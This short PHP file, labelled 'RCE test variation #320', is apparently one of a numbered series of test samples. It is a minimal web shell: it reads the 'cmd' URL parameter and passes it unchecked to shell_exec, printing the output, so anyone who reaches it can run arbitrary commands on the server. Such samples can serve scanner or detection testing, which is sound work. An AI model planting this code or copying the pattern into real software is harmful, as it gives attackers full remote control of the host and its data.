<?php
// RCE test variation #320
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>